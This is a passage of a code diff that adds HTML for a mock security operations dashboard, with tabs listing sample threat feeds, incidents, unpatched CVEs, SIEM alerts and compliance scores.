+                <div class="apt-meta">
+                  <div class="apt-tag">T1566.004 VISHING</div><div class="apt-tag">T1621 MFA BYPASS</div><div class="apt-tag">T1657 RANSOM</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- IOC + Feed status -->
+          <div style="display:flex;flex-direction:column;gap:12px;">
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot cyan"></div>THREAT FEED STATUS</div>
+              </div>
+              <div class="card-body" style="padding:8px 14px;">
+                <table class="data-table">
+                  <thead><tr><th>FEED SOURCE</th><th>TYPE</th><th>STATUS</th><th>LAST</th></tr></thead>
+                  <tbody>
+                    <tr><td class="text-secondary">MISP Community</td><td><span class="ioc-tag">STIX/TAXII</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">2m ago</td></tr>
+                    <tr><td class="text-secondary">VirusTotal Intel</td><td><span class="ioc-tag">Hash/URL</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">5m ago</td></tr>
+                    <tr><td class="text-secondary">Recorded Future</td><td><span class="ioc-tag">APT/CVE</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">8m ago</td></tr>
+                    <tr><td class="text-secondary">Mandiant Adv Intel</td><td><span class="ioc-tag">IOC/TTP</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">12m ago</td></tr>
+                    <tr><td class="text-secondary">AlienVault OTX</td><td><span class="ioc-tag">Pulse</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">15m ago</td></tr>
+                    <tr><td class="text-secondary">Shodan Monitor</td><td><span class="ioc-tag">IP/Port</span></td><td><span class="status status-contained">Delayed</span></td><td class="text-mono text-muted" style="font-size:10px;">47m ago</td></tr>
+                    <tr><td class="text-secondary">FBI IC3 Flash</td><td><span class="ioc-tag">Gov Intel</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">2h ago</td></tr>
+                    <tr><td class="text-secondary">CISA Known Vulns</td><td><span class="ioc-tag">KEV DB</span></td><td><span class="status status-active">Live</span></td><td class="text-mono text-muted" style="font-size:10px;">6h ago</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot amber"></div>IOC BREAKDOWN</div>
+              </div>
+              <div class="card-body">
+                <div class="sparkline-row"><div class="sp-name">Malicious IPs</div><div class="sp-bar"><div class="sp-fill pf-red" style="width:80%"></div></div><div class="sp-val text-red">21,440</div></div>
+                <div class="sparkline-row"><div class="sp-name">Malicious Domains</div><div class="sp-bar"><div class="sp-fill pf-amber" style="width:60%"></div></div><div class="sp-val text-amber">14,851</div></div>
+                <div class="sparkline-row"><div class="sp-name">Malware Hashes</div><div class="sp-bar"><div class="sp-fill pf-purple" style="width:45%"></div></div><div class="sp-val text-purple">8,734</div></div>
+                <div class="sparkline-row"><div class="sp-name">Malicious URLs</div><div class="sp-bar"><div class="sp-fill pf-cyan" style="width:30%"></div></div><div class="sp-val text-cyan">3,266</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: INCIDENTS
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-incidents">
+        <div class="page-header">
+          <div>
+            <div class="page-title">INCIDENT RESPONSE MANAGEMENT</div>
+            <div class="page-subtitle">ACTIVE INCIDENTS // PLAYBOOKS // EVIDENCE CHAIN // TIMELINE</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-red">+ CREATE INCIDENT</button>
+            <button class="btn btn-cyan">⬇ EXPORT</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid" style="grid-template-columns:repeat(5,1fr);">
+          <div class="kpi-card danger"><div class="kpi-label">CRITICAL</div><div class="kpi-value">3</div><div class="kpi-delta up">▲ 1 new</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">HIGH</div><div class="kpi-value">4</div><div class="kpi-delta neu">— stable</div></div>
+          <div class="kpi-card success"><div class="kpi-label">MEAN TTR</div><div class="kpi-value">2.4<span style="font-size:11px;font-weight:400;color:var(--text-muted);">hrs</span></div><div class="kpi-delta down">▼ improved</div></div>
+          <div class="kpi-card info"><div class="kpi-label">CLOSED (30D)</div><div class="kpi-value">218</div><div class="kpi-delta up">▲ 14%</div></div>
+          <div class="kpi-card purple"><div class="kpi-label">SLA BREACH RISK</div><div class="kpi-value">2</div><div class="kpi-delta up">▲ urgent</div></div>
+        </div>
+
+        <div class="filter-bar">
+          <span class="filter-chip active">ALL (7)</span>
+          <span class="filter-chip">CRITICAL (3)</span>
+          <span class="filter-chip">HIGH (4)</span>
+          <span class="filter-chip">ACTIVE</span>
+          <span class="filter-chip">CONTAINED</span>
+          <span class="filter-chip">MY INCIDENTS</span>
+        </div>
+
+        <div class="card section-gap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th style="width:130px;">INCIDENT ID</th>
+                <th>TITLE</th>
+                <th>SEVERITY</th>
+                <th>STATUS</th>
+                <th>AFFECTED ASSETS</th>
+                <th>ASSIGNEE</th>
+                <th>OPENED</th>
+                <th>SLA</th>
+                <th>ACTIONS</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1847</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Ransomware — PROD-DB-01 Encrypted</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">APT41 | LockBit 3.0 | T1486 Data Encrypted for Impact</div>
+                </td>
+                <td><span class="sev sev-critical">CRITICAL</span></td>
+                <td><span class="status status-active">Active</span></td>
+                <td>
+                  <span class="ioc-tag">PROD-DB-01</span>
+                  <span class="ioc-tag">PROD-DB-02</span>
+                </td>
+                <td class="text-secondary">A. Mitchell</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-15 12:08</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--red);">⚠ 1h 46m</span></td>
+                <td><button class="btn btn-red" style="font-size:10px;padding:3px 8px;">RESPOND</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1846</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Lateral Movement — Finance Network</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1021.001 RDP | T1550 Pass-the-Hash | 14 hosts affected</div>
+                </td>
+                <td><span class="sev sev-critical">CRITICAL</span></td>
+                <td><span class="status status-active">Active</span></td>
+                <td>
+                  <span class="ioc-tag">14 HOSTS</span>
+                  <span class="ioc-tag">FIN-VLAN</span>
+                </td>
+                <td class="text-secondary">J. Torres</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-15 09:31</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--red);">⚠ BREACHED</span></td>
+                <td><button class="btn btn-red" style="font-size:10px;padding:3px 8px;">RESPOND</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1845</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Privilege Escalation via svcadmin</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1078.002 Domain Account | Kerberoasting suspected</div>
+                </td>
+                <td><span class="sev sev-high">HIGH</span></td>
+                <td><span class="status status-contained">Contained</span></td>
+                <td><span class="ioc-tag">DC-01</span><span class="ioc-tag">svcadmin</span></td>
+                <td class="text-secondary">K. Osei</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-15 07:04</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--amber);">4h 18m</span></td>
+                <td><button class="btn btn-amber" style="font-size:10px;padding:3px 8px;">REVIEW</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1844</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Executive Phishing Campaign</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1566.001 Spearphishing | Fake DocuSign | CEO credentials at risk</div>
+                </td>
+                <td><span class="sev sev-high">HIGH</span></td>
+                <td><span class="status status-active">Active</span></td>
+                <td><span class="ioc-tag">EXEC TEAM</span><span class="ioc-tag">M365</span></td>
+                <td class="text-secondary">S. Kim</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-15 05:19</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--amber);">6h 03m</span></td>
+                <td><button class="btn btn-amber" style="font-size:10px;padding:3px 8px;">REVIEW</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1843</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">DNS Tunneling — R&D Segment</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1071.004 DNS C2 | Iodine tool detected | 2.3GB exfiltrated</div>
+                </td>
+                <td><span class="sev sev-high">HIGH</span></td>
+                <td><span class="status status-active">Active</span></td>
+                <td><span class="ioc-tag">RD-VLAN</span><span class="ioc-tag">DNS-SRV</span></td>
+                <td class="text-secondary">R. Patel</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-15 02:35</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--green);">9h 47m</span></td>
+                <td><button class="btn btn-amber" style="font-size:10px;padding:3px 8px;">REVIEW</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1842</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Data Exfiltration — 48GB FTP Transfer</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1048 Exfiltration Over C2 | Destination: 91.243.80.142 (RU)</div>
+                </td>
+                <td><span class="sev sev-critical">CRITICAL</span></td>
+                <td><span class="status status-contained">Contained</span></td>
+                <td><span class="ioc-tag">FTP-SRV-01</span></td>
+                <td class="text-secondary">A. Mitchell</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-14 23:58</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--green);">14h 24m</span></td>
+                <td><button class="btn btn-ghost" style="font-size:10px;padding:3px 8px;">CLOSE</button></td>
+              </tr>
+              <tr>
+                <td class="text-mono text-cyan">INC-2024-1841</td>
+                <td>
+                  <div class="fw-600" style="font-size:13px;">Supply Chain Alert — Vendor Portal Compromise</div>
+                  <div class="text-muted" style="font-size:10px;font-family:var(--font-mono);">T1195.002 Software Supply Chain | 3rd party library backdoor</div>
+                </td>
+                <td><span class="sev sev-high">HIGH</span></td>
+                <td><span class="status status-active">Active</span></td>
+                <td><span class="ioc-tag">VENDOR-API</span><span class="ioc-tag">5 APPS</span></td>
+                <td class="text-secondary">J. Torres</td>
+                <td class="text-mono text-muted" style="font-size:10px;">2025-01-14 18:44</td>
+                <td><span style="font-family:var(--font-mono);font-size:11px;color:var(--amber);">19h 38m</span></td>
+                <td><button class="btn btn-amber" style="font-size:10px;padding:3px 8px;">REVIEW</button></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: VULNERABILITIES
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-vulnerabilities">
+        <div class="page-header">
+          <div>
+            <div class="page-title">VULNERABILITY MANAGEMENT</div>
+            <div class="page-subtitle">CVE TRACKING // RISK SCORING // PATCH MANAGEMENT // REMEDIATION</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">⟳ RUN SCAN</button>
+            <button class="btn btn-cyan">⬇ PATCH REPORT</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid">
+          <div class="kpi-card danger"><div class="kpi-label">CRITICAL (CVSS≥9)</div><div class="kpi-value">23</div><div class="kpi-delta up">▲ 3 new</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">HIGH (CVSS 7-9)</div><div class="kpi-value">67</div><div class="kpi-delta up">▲ 9</div></div>
+          <div class="kpi-card info"><div class="kpi-label">MEDIUM (4-7)</div><div class="kpi-value">99</div><div class="kpi-delta down">▼ 4 patched</div></div>
+          <div class="kpi-card success"><div class="kpi-label">PATCHED (30D)</div><div class="kpi-value">344</div><div class="kpi-delta down">▼ 94%</div></div>
+          <div class="kpi-card purple"><div class="kpi-label">OVERDUE >30D</div><div class="kpi-value">31</div><div class="kpi-delta up">▲ critical</div></div>
+          <div class="kpi-card blue"><div class="kpi-label">ASSETS SCANNED</div><div class="kpi-value">2,847</div><div class="kpi-delta neu">— complete</div></div>
+        </div>
+
+        <div class="grid-7-3 section-gap">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot red"></div>CRITICAL & HIGH CVEs — UNPATCHED</div>
+              <span class="text-mono text-muted" style="font-size:10px;">SORTED BY RISK SCORE</span>
+            </div>
+            <table class="data-table">
+              <thead>
+                <tr>
+                  <th>CVE ID</th>
+                  <th>VULNERABILITY</th>
+                  <th>CVSS</th>
+                  <th>AFFECTED ASSETS</th>
+                  <th>EXPLOIT?</th>
+                  <th>STATUS</th>
+                  <th>DUE DATE</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td class="text-mono text-red" style="font-size:11px;">CVE-2024-21762</td>
+                  <td><div style="font-size:12px;font-weight:600;">FortiOS SSL-VPN Out-of-Bounds Write</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Fortinet FortiOS 7.x | RCE w/o auth | CISA KEV</div></td>
+                  <td><span class="cvss-score cvss-critical">9.8</span></td>
+                  <td><span class="ioc-tag">VPN-GW-01</span><span class="ioc-tag">VPN-GW-02</span></td>
+                  <td><span class="sev sev-critical">IN THE WILD</span></td>
+                  <td><span class="status status-open">Open</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--red);">OVERDUE</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-red" style="font-size:11px;">CVE-2024-3400</td>
+                  <td><div style="font-size:12px;font-weight:600;">PAN-OS GlobalProtect RCE (0-day)</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Palo Alto Networks | Command injection | UTA0218</div></td>
+                  <td><span class="cvss-score cvss-critical">10.0</span></td>
+                  <td><span class="ioc-tag">NGFW-CORE</span><span class="ioc-tag">PAN-01</span></td>
+                  <td><span class="sev sev-critical">IN THE WILD</span></td>
+                  <td><span class="status status-mitigated">Mitigated</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--amber);">2025-01-20</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-red" style="font-size:11px;">CVE-2024-38112</td>
+                  <td><div style="font-size:12px;font-weight:600;">Windows MSHTML Platform Spoofing</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Microsoft Windows | Zero-click exploitation via .url files</div></td>
+                  <td><span class="cvss-score cvss-critical">9.5</span></td>
+                  <td><span class="ioc-tag">847 WORKSTATIONS</span></td>
+                  <td><span class="sev sev-high">POC PUBLIC</span></td>
+                  <td><span class="status status-open">Open</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--red);">OVERDUE</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-amber" style="font-size:11px;">CVE-2024-6387</td>
+                  <td><div style="font-size:12px;font-weight:600;">OpenSSH regreSSHion — Race Condition RCE</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">OpenSSH < 9.8p1 | Signal handler race condition | Unauthenticated root</div></td>
+                  <td><span class="cvss-score cvss-critical">9.8</span></td>
+                  <td><span class="ioc-tag">312 LINUX SERVERS</span></td>
+                  <td><span class="sev sev-high">POC PUBLIC</span></td>
+                  <td><span class="status status-active">In Progress</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--amber);">2025-01-22</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-amber" style="font-size:11px;">CVE-2024-49039</td>
+                  <td><div style="font-size:12px;font-weight:600;">Windows Task Scheduler Privilege Escalation</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Microsoft Windows | Local privilege escalation to SYSTEM</div></td>
+                  <td><span class="cvss-score cvss-high">8.8</span></td>
+                  <td><span class="ioc-tag">1,204 SYSTEMS</span></td>
+                  <td><span class="sev sev-medium">PRIVATE</span></td>
+                  <td><span class="status status-active">In Progress</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--green);">2025-01-28</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-amber" style="font-size:11px;">CVE-2024-44243</td>
+                  <td><div style="font-size:12px;font-weight:600;">Apple macOS System Integrity Bypass</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">macOS < 15.2 | SIP bypass enabling rootkit persistence</div></td>
+                  <td><span class="cvss-score cvss-high">8.4</span></td>
+                  <td><span class="ioc-tag">244 MACBOOKS</span></td>
+                  <td><span class="sev sev-medium">PRIVATE</span></td>
+                  <td><span class="status status-patched">Patched</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--green);">DONE</td>
+                </tr>
+                <tr>
+                  <td class="text-mono text-amber" style="font-size:11px;">CVE-2024-50623</td>
+                  <td><div style="font-size:12px;font-weight:600;">Cleo Harmony/VLTrader Unrestricted Upload</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Clop ransomware group exploitation confirmed | MFT software</div></td>
+                  <td><span class="cvss-score cvss-critical">9.8</span></td>
+                  <td><span class="ioc-tag">MFT-SRV-01</span></td>
+                  <td><span class="sev sev-critical">IN THE WILD</span></td>
+                  <td><span class="status status-open">Open</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--red);">OVERDUE</td>
+                </tr>
+                <tr>
+                  <td class="text-mono" style="font-size:11px;color:var(--text-muted);">CVE-2024-45409</td>
+                  <td><div style="font-size:12px;font-weight:600;">Ruby SAML Authentication Bypass</div><div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">GitLab affected | XML signature wrapping attack | Full account takeover</div></td>
+                  <td><span class="cvss-score cvss-critical">10.0</span></td>
+                  <td><span class="ioc-tag">GITLAB-INT</span></td>
+                  <td><span class="sev sev-high">POC PUBLIC</span></td>
+                  <td><span class="status status-patched">Patched</span></td>
+                  <td class="text-mono" style="font-size:10px;color:var(--green);">DONE</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <!-- Patch velocity -->
+          <div style="display:flex;flex-direction:column;gap:12px;">
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot cyan"></div>PATCH VELOCITY</div>
+              </div>
+              <div class="card-body">
+                <div style="position:relative;height:160px;">
+                  <canvas id="patchChart" role="img" aria-label="Patch velocity bar chart showing monthly patching statistics">Patch velocity chart</canvas>
+                </div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-header">
+                <div class="card-title"><div class="dot amber"></div>REMEDIATION SLA</div>
+              </div>
+              <div class="card-body">
+                <div class="comp-framework" style="padding:8px 0;">
+                  <div class="comp-header"><div class="comp-name" style="font-size:11px;">CRITICAL (≤24h)</div><div class="comp-pct" style="color:var(--red);">61%</div></div>
+                  <div class="comp-bar"><div class="comp-fill" style="width:61%;background:var(--red);"></div></div>
+                </div>
+                <div class="comp-framework" style="padding:8px 0;">
+                  <div class="comp-header"><div class="comp-name" style="font-size:11px;">HIGH (≤7 days)</div><div class="comp-pct" style="color:var(--amber);">79%</div></div>
+                  <div class="comp-bar"><div class="comp-fill" style="width:79%;background:var(--amber);"></div></div>
+                </div>
+                <div class="comp-framework" style="padding:8px 0;">
+                  <div class="comp-header"><div class="comp-name" style="font-size:11px;">MEDIUM (≤30d)</div><div class="comp-pct" style="color:var(--green);">91%</div></div>
+                  <div class="comp-bar"><div class="comp-fill" style="width:91%;background:var(--green);"></div></div>
+                </div>
+                <div class="comp-framework" style="padding:8px 0;border-bottom:none;">
+                  <div class="comp-header"><div class="comp-name" style="font-size:11px;">LOW (≤90d)</div><div class="comp-pct" style="color:var(--cyan);">97%</div></div>
+                  <div class="comp-bar"><div class="comp-fill" style="width:97%;background:var(--cyan);"></div></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: ALERTS
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-alerts">
+        <div class="page-header">
+          <div>
+            <div class="page-title">SIEM ALERT QUEUE</div>
+            <div class="page-subtitle">REAL-TIME CORRELATION RULES // ALERT TRIAGE // FALSE POSITIVE MANAGEMENT</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">⚙ MANAGE RULES</button>
+            <button class="btn btn-ghost">⬇ BULK EXPORT</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid" style="grid-template-columns:repeat(4,1fr);">
+          <div class="kpi-card danger"><div class="kpi-label">CRITICAL UNACK</div><div class="kpi-value">14</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">HIGH UNACK</div><div class="kpi-value">47</div></div>
+          <div class="kpi-card info"><div class="kpi-label">TOTAL (24H)</div><div class="kpi-value">2,341</div></div>
+          <div class="kpi-card success"><div class="kpi-label">AUTO-CLOSED</div><div class="kpi-value">87%</div></div>
+        </div>
+
+        <div class="search-bar">
+          <span class="search-icon">⌕</span>
+          <input type="text" placeholder="Search alerts — src_ip, hostname, rule_name, alert_id, hash ...">
+          <button class="btn btn-cyan" style="font-size:10px;padding:4px 10px;">SEARCH</button>
+        </div>
+
+        <div class="filter-bar">
+          <span class="filter-chip active">ALL</span>
+          <span class="filter-chip">CRITICAL</span>
+          <span class="filter-chip">HIGH</span>
+          <span class="filter-chip">MALWARE</span>
+          <span class="filter-chip">INTRUSION</span>
+          <span class="filter-chip">EXFIL</span>
+          <span class="filter-chip">BRUTE FORCE</span>
+          <span class="filter-chip">POLICY</span>
+          <span class="filter-chip">ANOMALY</span>
+        </div>
+
+        <div class="card">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>ALERT ID</th>
+                <th>TIME (UTC)</th>
+                <th>RULE NAME</th>
+                <th>SEV</th>
+                <th>SRC IP</th>
+                <th>DST IP</th>
+                <th>HOSTNAME</th>
+                <th>CATEGORY</th>
+                <th>ACK</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14847</td><td class="text-mono text-muted" style="font-size:10px;">14:21:44</td><td style="font-size:12px;font-weight:600;">Ransomware File Encryption Activity</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-mono text-red" style="font-size:10px;">10.1.44.12</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">BROADCAST</td><td class="text-mono" style="font-size:11px;">PROD-DB-01</td><td><span class="ioc-tag red">MALWARE</span></td><td><button class="btn btn-red" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14846</td><td class="text-mono text-muted" style="font-size:10px;">14:19:02</td><td style="font-size:12px;font-weight:600;">C2 Beacon — Known Malicious IP</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-mono" style="font-size:10px;color:var(--amber);">10.50.22.147</td><td class="text-mono text-red" style="font-size:10px;">185.220.101.47</td><td class="text-mono" style="font-size:11px;">WORKST-FIN-042</td><td><span class="ioc-tag red">C2</span></td><td><button class="btn btn-red" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14845</td><td class="text-mono text-muted" style="font-size:10px;">14:18:07</td><td style="font-size:12px;font-weight:600;">Lateral Movement via RDP (T1021.001)</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-mono" style="font-size:10px;color:var(--amber);">10.1.44.12</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">10.1.44.0/24</td><td class="text-mono" style="font-size:11px;">14 HOSTS</td><td><span class="ioc-tag red">INTRUSION</span></td><td><button class="btn btn-red" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14844</td><td class="text-mono text-muted" style="font-size:10px;">14:16:33</td><td style="font-size:12px;font-weight:600;">LSASS Memory Dump Detected</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-mono" style="font-size:10px;color:var(--amber);">10.50.22.147</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:11px;">WORKST-FIN-042</td><td><span class="ioc-tag red">CRED DUMP</span></td><td><button class="btn btn-red" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14843</td><td class="text-mono text-muted" style="font-size:10px;">14:15:31</td><td style="font-size:12px;font-weight:600;">LDAP Brute Force — 847 Failures/120s</td><td><span class="sev sev-critical">CRIT</span></td><td class="text-mono text-red" style="font-size:10px;">192.168.5.0/24</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">10.0.1.5</td><td class="text-mono" style="font-size:11px;">DC-LDAP-01</td><td><span class="ioc-tag amber">BRUTE FORCE</span></td><td><button class="btn btn-amber" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14842</td><td class="text-mono text-muted" style="font-size:10px;">14:14:19</td><td style="font-size:12px;font-weight:600;">Encoded PowerShell Execution (T1059.001)</td><td><span class="sev sev-high">HIGH</span></td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:11px;">WORKST-EXEC-007</td><td><span class="ioc-tag amber">EXECUTION</span></td><td><button class="btn btn-amber" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14841</td><td class="text-mono text-muted" style="font-size:10px;">14:13:04</td><td style="font-size:12px;font-weight:600;">DNS Tunneling — Large TXT Record Volume</td><td><span class="sev sev-high">HIGH</span></td><td class="text-mono" style="font-size:10px;color:var(--amber);">10.20.33.88</td><td class="text-mono text-red" style="font-size:10px;">8.8.8.8</td><td class="text-mono" style="font-size:11px;">WORKST-RD-019</td><td><span class="ioc-tag amber">EXFIL</span></td><td><button class="btn btn-amber" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14840</td><td class="text-mono text-muted" style="font-size:10px;">14:11:22</td><td style="font-size:12px;font-weight:600;">New Admin Account Created — Off-Hours</td><td><span class="sev sev-high">HIGH</span></td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:11px;">DC-01</td><td><span class="ioc-tag purple">ANOMALY</span></td><td><button class="btn btn-ghost" style="font-size:9px;padding:2px 6px;">DONE</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14839</td><td class="text-mono text-muted" style="font-size:10px;">14:10:07</td><td style="font-size:12px;font-weight:600;">Sensitive Data Accessed — Bulk Download</td><td><span class="sev sev-high">HIGH</span></td><td class="text-mono" style="font-size:10px;color:var(--amber);">10.30.55.21</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">10.0.10.88</td><td class="text-mono" style="font-size:11px;">WORKST-HR-011</td><td><span class="ioc-tag purple">DLP</span></td><td><button class="btn btn-amber" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+              <tr><td class="text-mono text-cyan" style="font-size:10px;">ALT-20240115-14838</td><td class="text-mono text-muted" style="font-size:10px;">14:09:44</td><td style="font-size:12px;font-weight:600;">Suspicious Service Installation</td><td><span class="sev sev-high">HIGH</span></td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:10px;color:var(--text-muted);">LOCAL</td><td class="text-mono" style="font-size:11px;">SRV-APP-14</td><td><span class="ioc-tag amber">PERSIST</span></td><td><button class="btn btn-amber" style="font-size:9px;padding:2px 6px;">ACK</button></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ════════════════════════════════════════
+           TAB: COMPLIANCE
+      ════════════════════════════════════════ -->
+      <div class="tab-pane" id="tab-compliance">
+        <div class="page-header">
+          <div>
+            <div class="page-title">COMPLIANCE & GOVERNANCE</div>
+            <div class="page-subtitle">NIST CSF // ISO 27001 // SOC2 TYPE II // PCI-DSS v4.0 // GDPR // HIPAA</div>
+          </div>
+          <div style="display:flex;gap:8px;">
+            <button class="btn btn-amber">📋 AUDIT EVIDENCE</button>
+            <button class="btn btn-cyan">⬇ COMPLIANCE REPORT</button>
+          </div>
+        </div>
+
+        <div class="kpi-grid" style="grid-template-columns:repeat(4,1fr);">
+          <div class="kpi-card success"><div class="kpi-label">FRAMEWORKS ACTIVE</div><div class="kpi-value">6</div></div>
+          <div class="kpi-card warning"><div class="kpi-label">OPEN FINDINGS</div><div class="kpi-value">47</div></div>
+          <div class="kpi-card danger"><div class="kpi-label">CRITICAL GAPS</div><div class="kpi-value">8</div></div>
+          <div class="kpi-card info"><div class="kpi-label">NEXT AUDIT</div><div class="kpi-value" style="font-size:16px;">Feb 14</div><div class="kpi-delta neu">— 30 days</div></div>
+        </div>
+
+        <div class="grid-2 section-gap">
+          <!-- Framework scores -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title"><div class="dot cyan"></div>FRAMEWORK COMPLIANCE SCORES</div>
+            </div>
+            <div class="card-body">
+              <div class="comp-framework">
+                <div class="comp-header"><div class="comp-name">NIST CSF 2.0</div><div class="comp-pct" style="color:var(--green);">84%</div></div>
